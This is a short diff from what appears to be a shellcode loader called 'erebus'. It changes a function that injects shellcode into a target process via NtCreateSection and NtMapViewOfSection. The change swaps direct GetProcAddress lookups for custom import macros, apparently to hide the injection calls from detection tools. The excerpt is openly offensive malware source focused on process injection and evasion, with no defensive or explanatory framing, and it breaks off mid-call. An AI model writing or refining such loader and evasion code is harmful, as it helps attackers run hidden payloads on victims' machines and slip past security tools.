@@ -1,7 +1,7 @@
 #include "../../include/loader.hpp"
 
 namespace erebus {
-#if CONFIG_INJECTION_TYPE == 2
+#if CONFIG_INJECTION_TYPE == 1
 	VOID InjectionNtMapViewOfSection(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE process_handle, IN HANDLE thread_handle)
 	{
 		LOG_INFO("Injection via. NtMapViewOfSection");
@@ -9,13 +9,13 @@ namespace erebus {
 		HANDLE section_handle;
 		LARGE_INTEGER section_size = { shellcode_size };
 
-		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		HMODULE ntdll = ImportModule("ntdll.dll");
 		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
-		typeNtCreateSection NtCreateSection = (typeNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
-		typeNtMapViewOfSection NtMapViewOfSection = (typeNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
-		typeNtUnmapViewOfSection NtUnmapViewOfSection = (typeNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
-		typeNtResumeThread NtResumeThread = (typeNtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
-		typeNtClose NtClose = (typeNtClose)GetProcAddress(ntdll, "NtClose");
+		ImportFunction(ntdll, NtCreateSection, typeNtCreateSection);
+		ImportFunction(ntdll, NtMapViewOfSection, typeNtMapViewOfSection);
+		ImportFunction(ntdll, NtUnmapViewOfSection, typeNtUnmapViewOfSection);
+		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
+		ImportFunction(ntdll, NtClose, typeNtClose);
 
 		NTSTATUS status = NtCreateSection(
 			&section_handle,
